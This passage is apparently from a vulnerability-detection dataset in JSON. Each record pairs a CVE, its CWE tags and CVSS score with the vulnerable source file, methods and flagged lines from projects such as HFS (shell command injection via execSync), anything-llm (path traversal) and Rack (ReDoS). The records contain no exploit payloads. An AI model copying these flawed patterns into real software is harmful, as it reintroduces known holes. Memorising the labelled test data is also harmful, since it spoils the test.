          "content": "        setup.gotoPage(\"Scheduler\", \"SchedulerTestJob\", \"view\", \"spaceRedirect=false\");"
        }
      ]
    },
    "cwe": [
      "CWE-352"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.4,
    "cvss_version": 3.1
  },
  {
    "id": 20,
    "cve": "CVE-2024-22049",
    "description": "httparty before 0.21.0 is vulnerable to an assumed-immutable web parameter vulnerability. A remote and unauthenticated attacker can provide a crafted filename parameter during multipart/form-data uploads which could result in attacker controlled filenames being written.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/httparty/request/body.rb",
          "content": "# frozen_string_literal: true\n\nrequire_relative 'multipart_boundary'\n\nmodule HTTParty\n  class Request\n    class Body\n      NEWLINE = \"\\r\\n\"\n      private_constant :NEWLINE\n\n      def initialize(params, query_string_normalizer: nil, force_multipart: false)\n        @params = params\n        @query_string_normalizer = query_string_normalizer\n        @force_multipart = force_multipart\n      end\n\n      def call\n        if params.respond_to?(:to_hash)\n          multipart? ? generate_multipart : normalize_query(params)\n        else\n          params\n        end\n      end\n\n      def boundary\n        @boundary ||= MultipartBoundary.generate\n      end\n\n      def multipart?\n        params.respond_to?(:to_hash) && (force_multipart || has_file?(params))\n      end\n\n      private\n\n      def generate_multipart\n        normalized_params = params.flat_map { |key, value| HashConversions.normalize_keys(key, value) }\n\n        multipart = normalized_params.inject(''.dup) do |memo, (key, value)|\n          memo << \"--#{boundary}#{NEWLINE}\"\n          memo << %(Content-Disposition: form-data; name=\"#{key}\")\n          # value.path is used to support ActionDispatch::Http::UploadedFile\n          # https://github.com/jnunemaker/httparty/pull/585\n          memo << %(; filename=\"#{file_name(value)}\") if file?(value)\n          memo << NEWLINE\n          memo << \"Content-Type: #{content_type(value)}#{NEWLINE}\" if file?(value)\n          memo << NEWLINE\n          memo << content_body(value)\n          memo << NEWLINE\n        end\n\n        multipart << \"--#{boundary}--#{NEWLINE}\"\n      end\n\n      def has_file?(value)\n        if value.respond_to?(:to_hash)\n          value.to_hash.any? { |_, v| has_file?(v) }\n        elsif value.respond_to?(:to_ary)\n          value.to_ary.any? { |v| has_file?(v) }\n        else\n          file?(value)\n        end\n      end\n\n      def file?(object)\n        object.respond_to?(:path) && object.respond_to?(:read)\n      end\n\n      def normalize_query(query)\n        if query_string_normalizer\n          query_string_normalizer.call(query)\n        else\n          HashConversions.to_params(query)\n        end\n      end\n\n      def content_body(object)\n        if file?(object)\n          object = (file = object).read\n          file.rewind if file.respond_to?(:rewind)\n        end\n\n        object.to_s\n      end\n\n      def content_type(object)\n        return object.content_type if object.respond_to?(:content_type)\n        mime = MiniMime.lookup_by_filename(object.path)\n        mime ? mime.content_type : 'application/octet-stream'\n      end\n\n      def file_name(object)\n        object.respond_to?(:original_filename) ? object.original_filename : File.basename(object.path)\n      end\n\n      attr_reader :params, :query_string_normalizer, :force_multipart\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def generate_multipart\n        normalized_params = params.flat_map { |key, value| HashConversions.normalize_keys(key, value) }\n\n        multipart = normalized_params.inject(''.dup) do |memo, (key, value)|\n          memo << \"--#{boundary}#{NEWLINE}\"\n          memo << %(Content-Disposition: form-data; name=\"#{key}\")\n          # value.path is used to support ActionDispatch::Http::UploadedFile\n          # https://github.com/jnunemaker/httparty/pull/585\n          memo << %(; filename=\"#{file_name(value)}\") if file?(value)\n          memo << NEWLINE\n          memo << \"Content-Type: #{content_type(value)}#{NEWLINE}\" if file?(value)\n          memo << NEWLINE\n          memo << content_body(value)\n          memo << NEWLINE\n        end\n\n        multipart << \"--#{boundary}--#{NEWLINE}\"\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "          memo << %(; filename=\"#{file_name(value)}\") if file?(value)"
        }
      ]
    },
    "cwe": [
      "CWE-472",
      "CWE-668"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 929,
    "cve": "CVE-2024-39943",
    "description": "rejetto HFS (aka HTTP File Server) 3 before 0.52.10 on Linux, UNIX, and macOS allows OS command execution by remote authenticated users (if they have Upload permissions). This occurs because a shell is used to execute df (i.e., with execSync instead of spawnSync in child_process in Node.js).",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/util-os.ts",
          "content": "import { dirname, resolve } from 'path'\nimport { existsSync } from 'fs'\nimport { exec, execSync } from 'child_process'\nimport { onlyTruthy, splitAt, try_ } from './misc'\nimport _ from 'lodash'\nimport { pid } from 'node:process'\nimport { promisify } from 'util'\nimport { IS_WINDOWS } from './const'\n\nexport function getDiskSpaceSync(path: string) {\n    if (IS_WINDOWS) {\n        const drive = resolve(path).slice(0, 2).toUpperCase()\n        const out = execSync('wmic logicaldisk get Size,FreeSpace,Name /format:list').toString().replace(/\\r/g, '')\n        const one = parseKeyValueObjects(out).find(x => x.Name === drive)\n        if (!one)\n            throw Error('miss')\n        return { free: Number(one.FreeSpace), total: Number(one.Size) }\n    }\n    while (path && !existsSync(path))\n        path = dirname(path)\n    const out = try_(() => execSync(`df -k \"${path}\"`).toString(),\n        err => { throw err.status === 1 ? Error('miss') : err.status === 127 ? Error('unsupported') : err })\n    if (!out?.startsWith('Filesystem'))\n        throw Error('unsupported')\n    const one = out.split('\\n')[1] as string\n    const [used, free] = one.split(/\\s+/).slice(2, 4).map(x => Number(x) * 1024) as [number, number]\n    return { free, total: used + free }\n}\n\nexport async function getDiskSpaces(): Promise<{ name: string, free: number, total: number, description?: string }[]> {\n    if (IS_WINDOWS) {\n        const fields = ['Size','FreeSpace','Name','Description'] as const\n        const out = await runCmd(`wmic logicaldisk get ${fields.join()} /format:list`)\n        const objs = parseKeyValueObjects<typeof fields[number]>(out)\n        return onlyTruthy(objs.map(x => x.Size && {\n            total: Number(x.Size),\n            free: Number(x.FreeSpace),\n            name: x.Name,\n            description: x.Description\n        }))\n    }\n    const { stdout } = await promisify(exec)(`df -k -l`).catch(err => {\n        throw err.status === 1 ? Error('miss')\n            : err.status === 127 ? Error('unsupported')\n                : err\n    })\n    const out = stdout.split('\\n')\n    if (!out.shift()?.startsWith('Filesystem'))\n        throw Error('unsupported')\n    return onlyTruthy(out.map(one => {\n        const bits = one.split(/\\s+/)\n        const name = bits.pop() || bits.shift() || ''\n        const [, used=0, free=0] = bits.map(x => Number(x) * 1024)\n        const total = used + free\n        return total && { free, total, name }\n    }))\n}\n\nexport async function getDrives() {\n    const stdout = await runCmd('wmic logicaldisk get name')\n    return stdout.split('\\n').slice(1).map(x => x.trim()).filter(Boolean)\n}\n\n// execute win32 shell commands\nexport async function runCmd(cmd: string, args: string[] = []) {\n    const { stdout, stderr } = await promisify(exec)(`@chcp 65001 >nul & cmd /c ${cmd} ${args.join(' ')}`, { encoding: 'utf-8' })\n    return (stderr || stdout).replace(/\\r/g, '')\n}\n\nasync function getWindowsServicePids() {\n    const res = await runCmd(`wmic service get ProcessId`)\n    return _.uniq(res.split('\\n').slice(1).map(x => Number(x.trim())))\n}\n\nexport const RUNNING_AS_SERVICE = IS_WINDOWS && getWindowsServicePids().then(x => x.includes(pid))\n\nfunction parseKeyValueObjects<T extends string>(all: string, keySep='=', lineSep='\\n', objectSep=/\\n\\n+/) {\n    return all.split(objectSep).map(obj =>\n        Object.fromEntries(obj.split(lineSep).map(kv => splitAt(keySep, kv))) ) as { [k in T]: string }[]\n}"
        }
      ],
      "method_level": [
        "getDiskSpaceSync"
      ],
      "hunk_level": [
        {
          "line_no": 21,
          "content": "    const out = try_(() => execSync(`df -k \"${path}\"`).toString(),"
        }
      ]
    },
    "cwe": [
      "CWE-78",
      "CWE-284"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.9,
    "cvss_version": 3.1
  },
  {
    "id": 389,
    "cve": "CVE-2024-25126",
    "description": "Rack is a modular Ruby web server interface. Carefully crafted content type headers can cause Rack’s media type parser to take much longer than expected, leading to a possible denial of service vulnerability (ReDos 2nd degree polynomial). This vulnerability is patched in 3.0.9.1 and 2.2.8.1.",
    "vulnerability": {
      "file_level": [
        {
          "name": "lib/rack/media_type.rb",
          "content": "# frozen_string_literal: true\n\nmodule Rack\n  # Rack::MediaType parse media type and parameters out of content_type string\n\n  class MediaType\n    SPLIT_PATTERN = %r{\\s*[;,]\\s*}\n\n    class << self\n      # The media type (type/subtype) portion of the CONTENT_TYPE header\n      # without any media type parameters. e.g., when CONTENT_TYPE is\n      # \"text/plain;charset=utf-8\", the media-type is \"text/plain\".\n      #\n      # For more information on the use of media types in HTTP, see:\n      # http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.7\n      def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap(&:downcase!)\n      end\n\n      # The media type parameters provided in CONTENT_TYPE as a Hash, or\n      # an empty Hash if no CONTENT_TYPE or media-type parameters were\n      # provided.  e.g., when the CONTENT_TYPE is \"text/plain;charset=utf-8\",\n      # this method responds with the following Hash:\n      #   { 'charset' => 'utf-8' }\n      def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end\n\n      private\n\n        def strip_doublequotes(str)\n          (str.start_with?('\"') && str.end_with?('\"')) ? str[1..-2] : str\n        end\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def type(content_type)\n        return nil unless content_type\n        content_type.split(SPLIT_PATTERN, 2).first.tap(&:downcase!)\n      end",
        "def params(content_type)\n        return {} if content_type.nil?\n\n        content_type.split(SPLIT_PATTERN)[1..-1].each_with_object({}) do |s, hsh|\n          k, v = s.split('=', 2)\n\n          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)\n        end\n      end"
      ],
      "hunk_level": [
        {
          "line_no": 18,
          "content": "        content_type.split(SPLIT_PATTERN, 2).first.tap(&:downcase!)"
        },
        {
          "line_no": 32,
          "content": "          hsh[k.tap(&:downcase!)] = strip_doublequotes(v)"
        }
      ]
    },
    "cwe": [
      "CWE-1333"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 3.1
  },
  {
    "id": 421,
    "cve": "CVE-2024-28113",
    "description": "Peering Manager is a BGP session management tool. In Peering Manager <=1.8.2, it is possible to redirect users to an arbitrary page using a crafted url. As a result users can be redirected to an unexpected location. This issue has been addressed in version 1.8.3. Users are advised to upgrade. There are no known workarounds for this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "utils/views.py",
          "content": "from django.conf import settings\nfrom django.contrib.auth.mixins import (\n    PermissionRequiredMixin as _PermissionRequiredMixin,\n)\nfrom django.urls import reverse\nfrom django.urls.exceptions import NoReverseMatch\n\nfrom peering_manager.registry import registry\n\n__all__ = (\"PermissionRequiredMixin\", \"GetReturnURLMixin\")\n\n\nclass PermissionRequiredMixin(_PermissionRequiredMixin):\n    \"\"\"\n    Overrides the original `PermissionRequiredMixin` class to handle the\n    `LOGIN_REQUIRED` with `*.view_*` permission.\n    \"\"\"\n\n    def has_permission(self):\n        if (\n            not settings.LOGIN_REQUIRED\n            and isinstance(self.permission_required, str)\n            and \".view_\" in self.permission_required\n        ):\n            return True\n        else:\n            return super().has_permission()\n\n\nclass GetReturnURLMixin:\n    \"\"\"\n    Provides logic for determining where a user should be redirected after processing\n    a form.\n    \"\"\"\n\n    default_return_url = None\n\n    def get_return_url(self, request, instance=None):\n        # Check if `return_url` was specified as a query parameter or form\n        # data, use this URL only if it's safe\n        return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n        if return_url and return_url.startswith(\"/\"):\n            return return_url\n\n        # Check if the object being modified (if any) has an absolute URL\n        if (\n            instance is not None\n            and instance.pk\n            and hasattr(instance, \"get_absolute_url\")\n        ):\n            return instance.get_absolute_url()\n\n        # Fall back to the default URL (if specified) for the view\n        if self.default_return_url is not None:\n            return reverse(self.default_return_url)\n\n        # Try to resolve the list view for the object\n        if hasattr(self, \"queryset\"):\n            model_opts = self.queryset.model._meta\n            try:\n                return reverse(f\"{model_opts.app_label}:{model_opts.model_name}_list\")\n            except NoReverseMatch:\n                pass\n\n        # If all fails, send the user to the homepage\n        return reverse(\"home\")\n"
        }
      ],
      "method_level": [
        "def get_return_url(self, request, instance=None):\n        # Check if `return_url` was specified as a query parameter or form\n        # data, use this URL only if it's safe\n        return_url = request.GET.get(\"return_url\") or request.POST.get(\"return_url\")\n        if return_url and return_url.startswith(\"/\"):\n            return return_url\n\n        # Check if the object being modified (if any) has an absolute URL\n        if (\n            instance is not None\n            and instance.pk\n            and hasattr(instance, \"get_absolute_url\")\n        ):\n            return instance.get_absolute_url()\n\n        # Fall back to the default URL (if specified) for the view\n        if self.default_return_url is not None:\n            return reverse(self.default_return_url)\n\n        # Try to resolve the list view for the object\n        if hasattr(self, \"queryset\"):\n            model_opts = self.queryset.model._meta\n            try:\n                return reverse(f\"{model_opts.app_label}:{model_opts.model_name}_list\")\n            except NoReverseMatch:\n                pass\n\n        # If all fails, send the user to the homepage\n        return reverse(\"home\")"
      ],
      "hunk_level": [
        {
          "line_no": 40,
          "content": "        # data, use this URL only if it's safe"
        },
        {
          "line_no": 42,
          "content": "        if return_url and return_url.startswith(\"/\"):"
        }
      ]
    },
    "cwe": [
      "CWE-601"
    ],
    "severity": "LOW",
    "cvss_score": 3.5,
    "cvss_version": 3.1
  },
  {
    "id": 83,
    "cve": "CVE-2025-26619",
    "description": "Vega is a visualization grammar, a declarative format for creating, saving, and sharing interactive visualization designs. In `vega` 5.30.0 and lower and in `vega-functions` 5.15.0 and lower , it was possible to call JavaScript functions from the Vega expression language that were not meant to be supported. The issue is patched in `vega` `5.31.0`  and `vega-functions` `5.16.0`. Some workarounds are available. Run `vega` without `vega.expressionInterpreter`. This mode is not the default as it is slower. Alternatively, using the interpreter described in CSP safe mode (Content Security Policy) prevents arbitrary Javascript from running, so users of this mode are not affected by this vulnerability.",
    "vulnerability": {
      "file_level": [
        {
          "name": "packages/vega-functions/src/scales.js",
          "content": "import {ScalePrefix} from './constants';\nimport {scaleVisitor} from './visitors';\nimport {Literal} from 'vega-expression';\nimport {isFunction, isString, stringValue} from 'vega-util';\nimport {isRegisteredScale} from 'vega-scale';\n\nexport function getScale(nameOrFunction, ctx) {\n\n  if (isFunction(nameOrFunction)) {\n    return nameOrFunction;\n  }\n\n  if (isString(nameOrFunction)) {\n    const maybeScale = ctx.scales[nameOrFunction];\n    return (maybeScale && isRegisteredScale(maybeScale.value)) ? maybeScale.value : undefined;\n\n  }\n\n  return undefined;\n}\n\nexport function internalScaleFunctions(codegen, fnctx, visitors) {\n  // add helper method to the 'this' expression function context\n  fnctx.__bandwidth = s => s && s.bandwidth ? s.bandwidth() : 0;\n\n  // register AST visitors for internal scale functions\n  visitors._bandwidth = scaleVisitor;\n  visitors._range = scaleVisitor;\n  visitors._scale = scaleVisitor;\n\n  // resolve scale reference directly to the signal hash argument\n  const ref = arg => '_[' + (\n    arg.type === Literal\n      ? stringValue(ScalePrefix + arg.value)\n      : stringValue(ScalePrefix) + '+' + codegen(arg)\n  ) + ']';\n\n  // define and return internal scale function code generators\n  // these internal functions are called by mark encoders\n  return {\n    _bandwidth: args => `this.__bandwidth(${ref(args[0])})`,\n    _range: args => `${ref(args[0])}.range()`,\n    _scale: args => `${ref(args[0])}(${codegen(args[1])})`\n  };\n}\n"
        }
      ],
      "method_level": [
        "function getScale(nameOrFunction, ctx) {\n\n  if (isFunction(nameOrFunction)) {\n    return nameOrFunction;\n  }\n\n  if (isString(nameOrFunction)) {\n    const maybeScale = ctx.scales[nameOrFunction];\n    return (maybeScale && isRegisteredScale(maybeScale.value)) ? maybeScale.value : undefined;\n\n  }\n\n  return undefined;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 7,
          "content": "export function getScale(nameOrFunction, ctx) {"
        },
        {
          "line_no": 9,
          "content": "  if (isFunction(nameOrFunction)) {"
        },
        {
          "line_no": 10,
          "content": "    return nameOrFunction;"
        },
        {
          "line_no": 11,
          "content": "  }"
        },
        {
          "line_no": 13,
          "content": "  if (isString(nameOrFunction)) {"
        },
        {
          "line_no": 14,
          "content": "    const maybeScale = ctx.scales[nameOrFunction];"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 5.3,
    "cvss_version": 4.0
  },
  {
    "id": 582,
    "cve": "CVE-2024-3025",
    "description": "mintplex-labs/anything-llm is vulnerable to path traversal attacks due to insufficient validation of user-supplied input in the logo filename functionality. Attackers can exploit this vulnerability by manipulating the logo filename to reference files outside of the restricted directory. This can lead to unauthorized reading or deletion of files by utilizing the `/api/system/upload-logo` and `/api/system/logo` endpoints. The issue stems from the lack of filtering or validation on the logo filename, allowing attackers to target sensitive files such as the application's database.",
    "vulnerability": {
      "file_level": [
        {
          "name": "server/utils/files/logo.js",
          "content": "const path = require(\"path\");\nconst fs = require(\"fs\");\nconst { getType } = require(\"mime\");\nconst { v4 } = require(\"uuid\");\nconst { SystemSettings } = require(\"../../models/systemSettings\");\nconst LOGO_FILENAME = \"anything-llm.png\";\n\nfunction validFilename(newFilename = \"\") {\n  return ![LOGO_FILENAME].includes(newFilename);\n}\n\nfunction getDefaultFilename() {\n  return LOGO_FILENAME;\n}\n\nasync function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}\n\nfunction fetchLogo(logoPath) {\n  if (!fs.existsSync(logoPath)) {\n    return {\n      found: false,\n      buffer: null,\n      size: 0,\n      mime: \"none/none\",\n    };\n  }\n\n  const mime = getType(logoPath);\n  const buffer = fs.readFileSync(logoPath);\n  return {\n    found: true,\n    buffer,\n    size: buffer.length,\n    mime,\n  };\n}\n\nasync function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}\n\nasync function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}\n\nmodule.exports = {\n  fetchLogo,\n  renameLogoFile,\n  removeCustomLogo,\n  validFilename,\n  getDefaultFilename,\n  determineLogoFilepath,\n  LOGO_FILENAME,\n};\n"
        }
      ],
      "method_level": [
        "async function determineLogoFilepath(defaultFilename = LOGO_FILENAME) {\n  const currentLogoFilename = await SystemSettings.currentLogoFilename();\n  const basePath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\")\n    : path.join(__dirname, \"../../storage/assets\");\n  const defaultFilepath = path.join(basePath, defaultFilename);\n\n  if (currentLogoFilename && validFilename(currentLogoFilename)) {\n    customLogoPath = path.join(basePath, currentLogoFilename);\n    return fs.existsSync(customLogoPath) ? customLogoPath : defaultFilepath;\n  }\n\n  return defaultFilepath;\n}",
        "async function renameLogoFile(originalFilename = null) {\n  const extname = path.extname(originalFilename) || \".png\";\n  const newFilename = `${v4()}${extname}`;\n  const originalFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)\n    : path.join(__dirname, `../../storage/assets/${originalFilename}`);\n  const outputFilepath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)\n    : path.join(__dirname, `../../storage/assets/${newFilename}`);\n\n  fs.renameSync(originalFilepath, outputFilepath);\n  return newFilename;\n}",
        "async function removeCustomLogo(logoFilename = LOGO_FILENAME) {\n  if (!logoFilename || !validFilename(logoFilename)) return false;\n  const logoPath = process.env.STORAGE_DIR\n    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)\n    : path.join(__dirname, `../../storage/assets/${logoFilename}`);\n  if (fs.existsSync(logoPath)) fs.unlinkSync(logoPath);\n  return true;\n}"
      ],
      "hunk_level": [
        {
          "line_no": 24,
          "content": "    customLogoPath = path.join(basePath, currentLogoFilename);"
        },
        {
          "line_no": 55,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", originalFilename)"
        },
        {
          "line_no": 56,
          "content": "    : path.join(__dirname, `../../storage/assets/${originalFilename}`);"
        },
        {
          "line_no": 58,
          "content": "    ? path.join(process.env.STORAGE_DIR, \"assets\", newFilename)"
        },
        {
          "line_no": 59,
          "content": "    : path.join(__dirname, `../../storage/assets/${newFilename}`);"
        },
        {
          "line_no": 68,
          "content": "    ? path.join(process.env.STORAGE_DIR, `assets/${logoFilename}`)"
        },
        {
          "line_no": 69,
          "content": "    : path.join(__dirname, `../../storage/assets/${logoFilename}`);"
        }
      ]
    },
    "cwe": [
      "CWE-23"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.9,
    "cvss_version": 3.0
  },
  {
    "id": 118,
    "cve": "CVE-2024-23679",
    "description": "Enonic XP versions less than 7.7.4 are vulnerable to a session fixation issue. An remote and unauthenticated attacker can use prior sessions due to the lack of invalidating session attributes.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "modules/lib/lib-auth/src/main/java/com/enonic/xp/lib/auth/LoginHandler.java",
          "content": "package com.enonic.xp.lib.auth;\n\nimport java.util.Comparator;\nimport java.util.concurrent.Callable;\nimport java.util.function.Supplier;\nimport java.util.stream.Collectors;\n\nimport javax.servlet.http.HttpSession;\n\nimport com.enonic.xp.context.Context;\nimport com.enonic.xp.context.ContextBuilder;\nimport com.enonic.xp.portal.PortalRequest;\nimport com.enonic.xp.script.bean.BeanContext;\nimport com.enonic.xp.script.bean.ScriptBean;\nimport com.enonic.xp.security.IdProvider;\nimport com.enonic.xp.security.IdProviderKey;\nimport com.enonic.xp.security.IdProviders;\nimport com.enonic.xp.security.RoleKeys;\nimport com.enonic.xp.security.SecurityConstants;\nimport com.enonic.xp.security.SecurityService;\nimport com.enonic.xp.security.SystemConstants;\nimport com.enonic.xp.security.User;\nimport com.enonic.xp.security.auth.AuthenticationInfo;\nimport com.enonic.xp.security.auth.EmailPasswordAuthToken;\nimport com.enonic.xp.security.auth.UsernamePasswordAuthToken;\nimport com.enonic.xp.security.auth.VerifiedEmailAuthToken;\nimport com.enonic.xp.security.auth.VerifiedUsernameAuthToken;\nimport com.enonic.xp.session.Session;\n\npublic final class LoginHandler\n    implements ScriptBean\n{\n    private enum Scope\n    {\n        SESSION, REQUEST, NONE\n    }\n\n    private String user;\n\n    private String password;\n\n    private boolean skipAuth;\n\n    private String[] idProvider;\n\n    private Integer sessionTimeout;\n\n    private Scope scope;\n\n    private Supplier<SecurityService> securityService;\n\n    private Supplier<Context> context;\n\n    private Supplier<PortalRequest> portalRequestSupplier;\n\n    public void setUser( final String user )\n    {\n        this.user = user;\n    }\n\n    public void setPassword( final String password )\n    {\n        this.password = password;\n    }\n\n    public void setSkipAuth( final boolean skipAuth )\n    {\n        this.skipAuth = skipAuth;\n    }\n\n    public void setIdProvider( final String[] idProvider )\n    {\n        this.idProvider = idProvider;\n    }\n\n    public void setSessionTimeout( final Integer sessionTimeout )\n    {\n        this.sessionTimeout = sessionTimeout;\n    }\n\n    public void setScope( final String scope )\n    {\n        this.scope = Scope.valueOf( scope );\n    }\n\n    public LoginResultMapper login()\n    {\n        AuthenticationInfo authInfo = noIdProviderSpecified() ? attemptLoginWithAllExistingIdProviders() : attemptLogin();\n\n        if ( authInfo.isAuthenticated() )\n        {\n            switch ( this.scope )\n            {\n                case NONE:\n                    // do nothing\n                    break;\n                case REQUEST:\n                    this.context.get().getLocalScope().setAttribute( authInfo );\n                    break;\n                case SESSION:\n                default:\n                    createSession( authInfo );\n                    break;\n            }\n\n            return new LoginResultMapper( authInfo );\n        }\n        else\n        {\n            return new LoginResultMapper( authInfo, \"Access Denied\" );\n        }\n    }\n\n    private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }\n\n    private boolean noIdProviderSpecified()\n    {\n        return this.idProvider == null || this.idProvider.length == 0;\n    }\n\n    private AuthenticationInfo attemptLoginWithAllExistingIdProviders()\n    {\n        final IdProviders idProviders = runAsAuthenticated( this::getSortedIdProviders );\n\n        for ( IdProvider idProvider : idProviders )\n        {\n            final AuthenticationInfo authInfo = authenticate( idProvider.getKey() );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }\n\n    private AuthenticationInfo attemptLogin()\n    {\n\n        for ( String uStore : idProvider )\n        {\n            final AuthenticationInfo authInfo = authenticate( IdProviderKey.from( uStore ) );\n            if ( ( authInfo != null ) && authInfo.isAuthenticated() )\n            {\n                return authInfo;\n            }\n        }\n\n        return AuthenticationInfo.unAuthenticated();\n    }\n\n    private AuthenticationInfo authenticate( IdProviderKey idProvider )\n    {\n        AuthenticationInfo authInfo = null;\n\n        if ( isValidEmail( this.user ) )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedEmailAuthToken verifiedEmailAuthToken = new VerifiedEmailAuthToken();\n                verifiedEmailAuthToken.setEmail( this.user );\n                verifiedEmailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( verifiedEmailAuthToken ) );\n            }\n            else\n            {\n                final EmailPasswordAuthToken emailAuthToken = new EmailPasswordAuthToken();\n                emailAuthToken.setEmail( this.user );\n                emailAuthToken.setPassword( this.password );\n                emailAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( emailAuthToken ) );\n            }\n        }\n\n        if ( authInfo == null || !authInfo.isAuthenticated() )\n        {\n            if ( this.skipAuth )\n            {\n                final VerifiedUsernameAuthToken usernameAuthToken = new VerifiedUsernameAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n            else\n            {\n                final UsernamePasswordAuthToken usernameAuthToken = new UsernamePasswordAuthToken();\n                usernameAuthToken.setUsername( this.user );\n                usernameAuthToken.setPassword( this.password );\n                usernameAuthToken.setIdProvider( idProvider );\n\n                authInfo = runAsAuthenticated( () -> this.securityService.get().authenticate( usernameAuthToken ) );\n            }\n        }\n\n        return authInfo;\n    }\n\n    private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }\n\n    private boolean isValidEmail( final String value )\n    {\n        return value != null && value.chars().filter( ch -> ch == '@' ).count() == 1;\n    }\n\n    private void setSessionTimeout()\n    {\n        final PortalRequest portalRequest = this.portalRequestSupplier.get();\n        if ( portalRequest != null )\n        {\n            final HttpSession httpSession = portalRequest.getRawRequest().getSession();\n            if ( httpSession != null )\n            {\n                httpSession.setMaxInactiveInterval( this.sessionTimeout );\n            }\n        }\n    }\n\n    @Override\n    public void initialize( final BeanContext context )\n    {\n        this.securityService = context.getService( SecurityService.class );\n        this.context = context.getBinding( Context.class );\n        this.portalRequestSupplier = context.getBinding( PortalRequest.class );\n    }\n}\n"
        }
      ],
      "method_level": [
        "private void createSession( final AuthenticationInfo authInfo )\n    {\n        final Session session = this.context.get().getLocalScope().getSession();\n        if ( session != null )\n        {\n            session.setAttribute( authInfo );\n        }\n\n        if ( this.sessionTimeout != null )\n        {\n            setSessionTimeout();\n        }\n    }",
        "private IdProviders getSortedIdProviders()\n    {\n        IdProviders idProviders = securityService.get().getIdProviders();\n        return IdProviders.from( idProviders.stream().\n            sorted( Comparator.comparing( u -> u.getKey().toString() ) ).\n            collect( Collectors.toList() ) );\n    }",
        "private <T> T runAsAuthenticated( Callable<T> runnable )\n    {\n        final AuthenticationInfo authInfo = AuthenticationInfo.create().principals( RoleKeys.AUTHENTICATED ).user( User.ANONYMOUS ).build();\n        return ContextBuilder.from( this.context.get() ).\n            authInfo( authInfo ).\n            repositoryId( SystemConstants.SYSTEM_REPO_ID ).\n            branch( SecurityConstants.BRANCH_SECURITY ).build().\n            callWith( runnable );\n    }"
